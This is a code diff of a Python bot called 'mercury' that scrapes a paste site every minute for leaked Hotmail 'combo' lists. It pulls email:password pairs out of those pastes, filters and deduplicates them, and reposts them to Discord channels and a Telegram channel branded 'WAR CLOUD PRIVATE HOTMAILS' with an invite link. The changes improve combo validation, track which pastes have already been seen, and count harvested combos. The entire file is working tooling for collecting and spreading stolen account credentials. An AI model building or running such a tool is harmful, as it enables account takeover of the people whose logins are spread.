@@ -5,13 +5,15 @@ Deploy on Railway. Scrapes Pasteview every 1 minute, posts to 3 channels.
 
 import asyncio
 import io
+import json
 import logging
 import os
-import re
-from datetime import datetime, timezone
-
-import re
 import random
+import re
+import time
+from datetime import datetime, timezone
+from pathlib import Path
+
 import aiohttp
 import discord
 from discord.ext import commands, tasks
@@ -20,16 +22,18 @@ from playwright.async_api import async_playwright
 
 # ─── CONFIG ──────────────────────────────────────────────────────────────────
 DISCORD_TOKEN      = os.environ["DISCORD_TOKEN"]
-CHANNEL_ID         = int(os.environ["CHANNEL_ID"])          # all found URLs as .txt every minute
-NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])      # new URL alerts only
-CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"]) # extracted credentials from new pastes
-
-TELEGRAM_TOKEN       = os.environ["TELEGRAM_TOKEN"]
-TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]         # public channel (every 5th line)
+CHANNEL_ID         = int(os.environ["CHANNEL_ID"])
+NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])
+CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"])
+TELEGRAM_TOKEN     = os.environ["TELEGRAM_TOKEN"]
+TELEGRAM_CHAT      = os.environ["TELEGRAM_CHAT"]
 
 CHECK_INTERVAL = 1
 PAGES_TO_SCAN  = 5
 ARCHIVE_URL    = "https://pasteview.com/paste-archive"
+SEEN_FILE      = "seen_urls.json"
+
+KEYWORDS = ["hotmail", "hits", "mixed"]
 
 # ─── LOGGING ─────────────────────────────────────────────────────────────────
 logging.basicConfig(
@@ -40,9 +44,28 @@ logging.basicConfig(
 log = logging.getLogger("mercury")
 
 # ─── STATE ───────────────────────────────────────────────────────────────────
-posted_urls: set = set()
+start_time = time.time()
+stats = {"total_pastes": 0, "total_combos": 0, "scans": 0}
 
-# ─── HELPERS ─────────────────────────────────────────────────────────────────
+def load_seen() -> set:
+    if Path(SEEN_FILE).exists():
+        try:
+            with open(SEEN_FILE) as f:
+                return set(json.load(f))
+        except Exception:
+            pass
+    return set()
+
+def save_seen(seen: set):
+    try:
+        with open(SEEN_FILE, "w") as f:
+            json.dump(list(seen), f)
+    except Exception as e:
+        log.error(f"Failed to save seen URLs: {e}")
+
+posted_urls: set = load_seen()
+
+# ─── CREDENTIAL VALIDATION ───────────────────────────────────────────────────
 EMOJI_RE = re.compile(
     "["
     u"\U0001F600-\U0001F64F"
@@ -55,36 +78,51 @@ EMOJI_RE = re.compile(
     "]+", flags=re.UNICODE
 )
 
-TELEGRAM_DOMAINS = ("t.me", "telegram.me", "telegram.dog")
+JUNK_DOMAINS   = ("t.me", "telegram.me", "telegram.dog", "discord.gg", "http://", "https://")
+VALID_EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")
 
-def is_junk_line(line: str) -> bool:
+def is_valid_combo(line: str) -> bool:
+    """Strictly validate email:password format, reject all junk."""
+    if not line or len(line) > 200:
+        return False
     if "|" in line:
-        return True
-    if any(d in line.lower() for d in TELEGRAM_DOMAINS):
-        return True
+        return False
     if EMOJI_RE.search(line):
-        return True
-    return False
+        return False
+    if any(d in line.lower() for d in JUNK_DOMAINS):
+        return False
+    if ":" not in line:
+        return False
+    parts = line.split(":", 1)
+    if len(parts) != 2:
+        return False
+    email, password = parts[0].strip(), parts[1].strip()
+    if not password or len(password) < 3:
+        return False
+    if not VALID_EMAIL_RE.match(email):
+        return False
+    return True
 
 def extract_credentials(raw: str) -> list[str]:
+    seen = set()
     lines = []
     for line in raw.splitlines():
         line = line.strip()
         if not line:
             continue
-        if is_junk_line(line):
+        if not is_valid_combo(line):
             continue
-        if "@" in line and ":" in line:
-            parts = line.split(":", 1)
-            if len(parts) == 2 and "@" in parts[0] and "." in parts[0]:
-                lines.append(line)
+        if line in seen:
+            continue
+        seen.add(line)
+        lines.append(line)
     return lines
 
-async def send_telegram_file(text: str, filename: str, chat_id: str = None):
-    chat_id = chat_id or TELEGRAM_CHAT
+# ─── TELEGRAM ────────────────────────────────────────────────────────────────
+async def send_telegram_file(text: str, filename: str):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
     data = aiohttp.FormData()
-    data.add_field("chat_id", chat_id)
+    data.add_field("chat_id", TELEGRAM_CHAT)
     data.add_field("document", text.encode(), filename=filename, content_type="text/plain")
     try:
         async with aiohttp.ClientSession() as session:
@@ -93,20 +131,9 @@ async def send_telegram_file(text: str, filename: str, chat_id: str = None):
                     body = await resp.text()
                     log.error(f"Telegram API error {resp.status}: {body}")
                 else:
-                    log.info(f"Posted file to Telegram [{chat_id}]")
+                    log.info("Posted to Telegram")
     except Exception as e:
         log.error(f"Failed to send to Telegram: {e}")
-
-
-async def send_telegram_message(text: str, chat_id: str = None):
-    chat_id = chat_id or TELEGRAM_CHAT
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    try:
-        async with aiohttp.ClientSession() as session:
-            await session.post(url, json={"chat_id": chat_id, "text": text})
-    except Exception as e:
-        log.error(f"Failed to send Telegram message: {e}")
-
 
 # ─── BOT ─────────────────────────────────────────────────────────────────────
 intents = discord.Intents.default()
@@ -134,6 +161,61 @@ async def post_new_alerts(channel, pastes: list[dict]):
             log.error(f"Failed to post alert: {e}")
 
 
+async def extract_raw(page, url: str) -> str:
+    """Extract raw text from a paste URL with retries."""
+    for attempt in range(2):
+        try:
+            await page.goto(url, wait_until="networkidle", timeout=15000)
+            await page.wait_for_timeout(1500)
+
+            # Ace editor API
+            raw = await page.evaluate("""
+                () => {
+                    if (window.ace) {
+                        const editors = document.querySelectorAll('.ace_editor');
+                        for (let ed of editors) {
+                            try {
+                                const val = ace.edit(ed).getValue();
+                                if (val && val.trim()) return val;
+                            } catch(e) {}
+                        }
+                    }
+                    const edEl = document.querySelector('.ace_editor');
+                    if (edEl && edEl.env && edEl.env.editor)
+                        return edEl.env.editor.getValue();
+                    return null;
+                }
+            """)
+
+            # Scroll fallback
+            if not raw or not raw.strip():
+                await page.evaluate("""
+                    () => {
+                        const s = document.querySelector('.ace_scroller');
+                        if (s) s.scrollTop = s.scrollHeight;
+                    }
+                """)
+                await page.wait_for_timeout(800)
+                lines = await page.query_selector_all("div.ace_line")
+                raw = "\n".join([(await l.text_content() or "").strip() for l in lines])
+
+            # Pre tag fallback
+            if not raw or not raw.strip():
+                pre = await page.query_selector("pre")
+                if pre:
+                    raw = await pre.text_content()
+
+            if raw and raw.strip():
+                return raw
+
+        except Exception as e:
+            log.error(f"Extract attempt {attempt+1} failed for {url}: {e}")
+            if attempt == 0:
+                await asyncio.sleep(2)
+
+    return ""
+
+
 # ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
 @tasks.loop(minutes=CHECK_INTERVAL)
 async def monitor_loop():
@@ -143,7 +225,8 @@ async def monitor_loop():
         log.error(f"Could not get channel: {e}")
         return
 
-    log.info("Running scheduled check...")
+    stats["scans"] += 1
+    log.info(f"Running scan #{stats['scans']}...")
 
     async with async_playwright() as p:
         browser = await p.chromium.launch(
@@ -170,18 +253,18 @@ async def monitor_loop():
                             if disabled is not None or aria_dis == "true":
                                 break
                             await btn.click()
-                            await page.wait_for_timeout(2500)
+                            await page.wait_for_timeout(2000)
                             navigated = True
                             break
                     if not navigated:
                         break
 
                 matches = await page.evaluate("""
-                    () => {
+                    (keywords) => {
                         const results = [];
                         for (const a of document.querySelectorAll('a')) {
-                            const text = a.innerText || a.textContent || '';
-                            if (text.toLowerCase().includes('hotmail')) {
+                            const text = (a.innerText || a.textContent || '').toLowerCase();
+                            if (keywords.some(k => text.includes(k))) {
                                 const href = a.href;
                                 if (href
                                     && !href.includes('/paste-archive')
@@ -189,7 +272,7 @@ async def monitor_loop():
                                     && !href.endsWith('/')
                                     && href !== window.location.href) {
                                     results.push({
-                                        title: text.trim().replace(/\\s+/g, ' '),
+                                        title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
                                         url: href
                                     });
                                 }
@@ -197,7 +280,7 @@ async def monitor_loop():
                         }
                         return results;
                     }
-                """)
+                """, KEYWORDS)
                 log.info(f"Page {page_num}: {len(matches)} match(es)")
                 found.extend(matches)
 
@@ -209,10 +292,12 @@ async def monitor_loop():
                     seen_this_run.add(item["url"])
                     pastes.append(item)
 
+            stats["total_pastes"] += len(pastes)
+
             # ── Step 2: channel 1 — all found URLs as .txt ────────────────
             await post_pastes(channel, pastes)
 
-            # ── Step 3: figure out new pastes & mark seen immediately ─────
+            # ── Step 3: find new pastes & mark seen immediately ───────────
             new_pastes = [p for p in pastes if p["url"] not in posted_urls]
             if not new_pastes:
                 log.info("No new pastes this run")
@@ -220,6 +305,7 @@ async def monitor_loop():
 
             for p in new_pastes:
                 posted_urls.add(p["url"])
+            save_seen(posted_urls)
 
             log.info(f"{len(new_pastes)} new paste(s) detected")
 
@@ -230,92 +316,46 @@ async def monitor_loop():
             except Exception as e:
                 log.error(f"Could not post to new channel: {e}")
 
-            # ── Step 5: channel 3 — extract creds from new pastes ─────────
+            # ── Step 5: channel 3 — extract & validate creds ──────────────
             try:
                 content_channel = bot.get_channel(CONTENT_CHANNEL_ID) or await bot.fetch_channel(CONTENT_CHANNEL_ID)
                 combined = []
 
                 for item in new_pastes[:5]:
                     url = item["url"]
-                    log.info(f"Extracting content from {url}")
-                    try:
-                        await page.goto(url, wait_until="networkidle", timeout=15000)
-                        await page.wait_for_timeout(1500)
-
-                        raw = await page.evaluate("""
-                            () => {
-                                if (window.ace) {
-                                    const editors = document.querySelectorAll('.ace_editor');
-                                    for (let ed of editors) {
-                                        try {
-                                            const val = ace.edit(ed).getValue();
-                                            if (val && val.trim()) return val;
-                                        } catch(e) {}
-                                    }
-                                }
-                                const edEl = document.querySelector('.ace_editor');
-                                if (edEl && edEl.env && edEl.env.editor)
-                                    return edEl.env.editor.getValue();
-                                return null;
-                            }
-                        """)
-
-                        if not raw or not raw.strip():
-                            await page.evaluate("""
-                                () => {
-                                    const s = document.querySelector('.ace_scroller');
-                                    if (s) s.scrollTop = s.scrollHeight;
-                                }
-                            """)
-                            await page.wait_for_timeout(800)
-                            lines = await page.query_selector_all("div.ace_line")
-                            raw = "\n".join([(await l.text_content() or "").strip() for l in lines])
-
-                        if not raw or not raw.strip():
-                            pre = await page.query_selector("pre")
-                            if pre:
-                                raw = await pre.text_content()
-
-                        if raw and raw.strip():
-                            creds = extract_credentials(raw)
-                            if creds:
-                                combined.append("\n".join(creds))
-                                log.info(f"Got {len(creds)} credential lines from {url}")
-                            else:
-                                log.info(f"No credential lines in {url}")
+                    log.info(f"Extracting from {url}")
+                    raw = await extract_raw(page, url)
+                    if raw:
+                        creds = extract_credentials(raw)
+                        if creds:
+                            combined.append("\n".join(creds))
+                            stats["total_combos"] += len(creds)
+                            log.info(f"✓ {len(creds)} valid combos from {url}")
                         else:
-                            log.info(f"No content extracted from {url}")
-
-                    except Exception as e:
-                        log.error(f"Failed to extract {url}: {e}")
+                            log.info(f"No valid combos in {url}")
+                    else:
+                        log.info(f"No content extracted from {url}")
 
                 if combined:
                     output = "\n\n".join(combined)
-                    filename = "HOTMAIL.txt"
+                    filename = f"content_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
+
+                    # Discord
                     await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
-                    log.info("Posted combined content file")
+                    log.info("Posted to Discord content channel")
+
+                    # Telegram — shuffle + header
+                    all_creds = [line for block in combined for line in block.splitlines() if line.strip()]
+                    random.shuffle(all_creds)
                     tg_header = (
                         "WAR CLOUD PRIVATE HOTMAILS\n"
                         "------------------------\n"
                         "https://t.me/+5Bqqamk3cpcxNDA0\n"
                         "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                        "https://t.me/+5Bqqamk3cpcxNDA0\n"
-                        "\n"
+                        "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                     )
-                    all_creds = []
-                    for block in combined:
-                        for line in block.splitlines():
-                            if not line.startswith("#") and line.strip():
-                                all_creds.append(line)
-                    random.shuffle(all_creds)
                     tg_output = tg_header + "\n".join(all_creds)
-
-                    # TELEGRAM_CHAT = private channel — gets ALL combos
-                    await send_telegram_file(tg_output, filename, chat_id=TELEGRAM_CHAT)
-
-
-                    # TELEGRAM_PUBLIC_CHAT = public channel — every 5th PASTE only
-                    # paste_index tracks which paste number we are on globally this run
+                    await send_telegram_file(tg_output, filename)
 
                 else:
                     log.info("Nothing to post to content channel")
@@ -334,14 +374,31 @@ async def before_monitor():
     await bot.wait_until_ready()
 
 
-# ─── SLASH COMMAND ───────────────────────────────────────────────────────────
+# ─── SLASH COMMANDS ───────────────────────────────────────────────────────────
 @tree.command(name="scrape", description="Manually trigger a scrape right now")
 @app_commands.describe(pages="Number of archive pages to scan (default: 5)")
 async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCAN):
     await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
-    channel = bot.get_channel(CHANNEL_ID) or await bot.fetch_channel(CHANNEL_ID)
     await monitor_loop()
     await interaction.followup.send("✅ Done.", ephemeral=True)
+
+
+@tree.command(name="stats", description="Show bot stats")
+async def cmd_stats(interaction: discord.Interaction):
+    uptime_secs = int(time.time() - start_time)
+    hours, remainder = divmod(uptime_secs, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    uptime_str = f"{hours}h {minutes}m {seconds}s"
+
+    embed = discord.Embed(title="MERCURY // STATS", color=0xCC0000,
+                          timestamp=datetime.now(timezone.utc))
+    embed.add_field(name="Uptime",        value=uptime_str,                   inline=True)
+    embed.add_field(name="Scans Run",     value=str(stats["scans"]),          inline=True)
+    embed.add_field(name="Pastes Found",  value=str(stats["total_pastes"]),   inline=True)
+    embed.add_field(name="Combos Found",  value=str(stats["total_combos"]),   inline=True)
+    embed.add_field(name="URLs Tracked",  value=str(len(posted_urls)),        inline=True)
+    embed.add_field(name="Check Every",   value=f"{CHECK_INTERVAL} min",      inline=True)
+    await interaction.response.send_message(embed=embed)
 
 
 # ─── EVENTS ──────────────────────────────────────────────────────────────────
